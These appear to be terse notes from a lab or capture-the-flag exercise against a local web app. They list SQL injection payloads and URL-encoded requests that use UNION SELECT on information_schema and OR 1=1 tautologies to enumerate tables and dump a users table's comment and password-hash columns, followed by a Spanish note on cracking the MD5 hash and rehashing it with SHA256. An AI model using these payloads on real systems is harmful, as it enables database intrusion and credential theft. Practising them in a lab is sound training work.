1 UNION SELECT null, table_name FROM information_schema.tables
http://localhost:8080/index.php?page=member&id=1+UNION+SELECT+null%2C+table_name+FROM+information_schema.tables&Submit=Submit#


1 OR 1=1
1 OR EXISTS (SELECT * FROM users)
http://localhost:8080/index.php?page=member&id=1+OR+EXISTS+%28SELECT+*+FROM+users+%29%3B+--+&Submit=Submit#

http://localhost:8080/index.php?page=member&id=1+UNION+SELECT+table_name%2C+column_name+FROM+information_schema.columns&Submit=Submit#
1 UNION SELECT table_name, column_name FROM information_schema.columns

User table contains the following columns: user_id, first_name, last_name, town, country, planet, Commentaire, countersign.

1 OR 1=1 UNION SELECT Commentaire, countersign from users
desencriptar con md5 la clave hacer lowercase y encriptar con sha256
